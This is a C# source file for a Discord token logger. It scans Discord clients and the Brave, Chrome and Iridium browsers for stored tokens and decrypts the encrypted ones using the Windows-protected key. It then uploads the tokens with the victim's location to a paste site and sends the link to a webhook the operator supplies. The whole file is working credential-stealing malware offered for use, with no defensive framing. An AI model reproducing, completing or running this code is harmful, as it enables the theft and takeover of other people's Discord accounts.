using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Net.Http;

using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace TokenLogger
{
    public delegate void FunctionInvoker();

    internal class Engine
    {
        private string AppDataRoaming { get; } = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private string AppDataLocal { get; } = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private string WebHook { get; } = String.Empty; // <= Your webhook link goes here.
        
        private string EncryptedKey { get; set; }
        private Regex EncryptedKeyRegex { get; set; }
        private Regex NormalRegexPattern { get; set; }
        private Regex EncryptedRegexPattern { get; set; }
        private List<string> NormalTokens { get; set; }
        private List<string> EncryptedTokens { get; set; }
        private List<string> DecryptedTokens { get; set; }
        private Dictionary<string, string> DiscordPathInformation { get; set; }
        private Dictionary<string, string> DiscordTokenData { get; set; }

        public void Run()
        {
            this.EncryptedKeyRegex = new Regex("(?<key>[a-zA-Z0-9\\/\\+]{356})\"\\}\\}");
            this.NormalRegexPattern = new Regex(@"(?:[\w-]{24}([.])[\w-]{6}\1[\w-]{27}|mfa[.]\w{84})");
            this.EncryptedRegexPattern = new Regex("dQw4w9WgXcQ:[^\"]*");
            this.NormalTokens = new List<string>();
            this.EncryptedTokens = new List<string>();
            this.DecryptedTokens = new List<string>();
            this.DiscordPathInformation = new Dictionary<string, string>()
            {
                { "Discord",          AppDataRoaming + @"\discord\Local Storage\leveldb" },
                { "Discord(PTB)",     AppDataRoaming + @"\discordptb\Local Storage\leveldb" },
                { "Discord(Canary)",  AppDataRoaming + @"\discordcanary\Local Storage\leveldb" },
                { "Browser(Brave)",   AppDataLocal   + @"\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" },
                { "Browser(Chrome)",  AppDataLocal   + @"\Google\Chrome\User Data\Default\Local Storage\leveldb" },
                { "Browser(Iridium)", AppDataLocal   + @"\Iridium\User Data\Default\Local Storage\leveldb"}
            };

            List<FunctionInvoker> functions = new List<FunctionInvoker>()
            {
                AcquireEncryptedKey,
                ExtractTokens,
                SendTokens
            };

            functions.ForEach(currentFunction => currentFunction.Invoke());
        }

        private void AcquireEncryptedKey()
        {
            try
            {
                string localStateContent = File.ReadAllText(AppDataRoaming + @"\discord\Local State");
                this.EncryptedKey = this.EncryptedKeyRegex.Match(localStateContent).Groups["key"].Value;
            }
            catch (DirectoryNotFoundException)
            {
                SetConsoleColor.Color(ConsoleColor.Red);
                Console.WriteLine($"[!] Cannot find {AppDataRoaming}\\discord\\Local State");
            }
        }

        private void ExtractTokens()
        {
            foreach (KeyValuePair<string, string> currentPath in this.DiscordPathInformation)
            {
                try
                {
                    foreach (string LDBFile in Directory.GetFiles(currentPath.Value, "*ldb"))
                    {
                        string LDBFileContent = File.ReadAllText(LDBFile);

                        foreach (Match normalTokenMatch in this.NormalRegexPattern.Matches(LDBFileContent))
                        {
                            this.NormalTokens.Add($"{currentPath.Key} => {normalTokenMatch.Value}");
                        }

                        foreach (Match encryptedTokenMatch in this.EncryptedRegexPattern.Matches(LDBFileContent))
                        {
                            this.EncryptedTokens.Add(encryptedTokenMatch.Value);
                        }
                    }
                }
                catch (DirectoryNotFoundException)
                {
                    SetConsoleColor.Color(ConsoleColor.Red);
                    Console.WriteLine($"[!] Directory for {currentPath.Key} not found.");
                    continue;
                }
            }

            for (int i = 0; i < this.EncryptedTokens.Count; i++)
            {
                this.DecryptedTokens.Add(DecryptToken(Convert.FromBase64String(EncryptedTokens[i].Split("dQw4w9WgXcQ:")[1])));
            }
        }

        private byte[] DecryptKey()
        {
            return ProtectedData.Unprotect(Convert.FromBase64String(this.EncryptedKey).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        public string DecryptToken(byte[] buff)
        {
            byte[] EncryptedData = buff.Skip(15).ToArray();
            AeadParameters Params = new(new KeyParameter(DecryptKey()), 128, buff.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }

        private void SendTokens()
        {
            Location location = new Location();
            Paste paste = new Paste();

            paste.UploadPaste(NT: this.NormalTokens, 
                              ET: this.EncryptedTokens, 
                              DT: this.DecryptedTokens, 
                              location: location.GetLocation());

            this.DiscordTokenData = new Dictionary<string, string>()
            {
                { "content", paste.FinalUrl },
                { "username", "https://github.com/ihaai" },
                { "avatar_url", "https://cdn.discordapp.com/attachments/582786562295857162/916249071457554472/unknown.png" }
            };

            try
            {
                using (HttpClient httpClient = new HttpClient())
                {
                    httpClient.PostAsync(this.WebHook, new FormUrlEncodedContent(this.DiscordTokenData)).Wait();
                }

                SetConsoleColor.Color(ConsoleColor.Green);
                Console.WriteLine("[+] Paste successfully sent to the webhook!");
            }
            catch (HttpRequestException)
            {
                SetConsoleColor.Color(ConsoleColor.Red);
                Console.WriteLine("[!] HTTPERROR: Couldn't send paste to webhook. Please open an issue in the GitHub repository and I will look at it!");
            }
        }
    }
}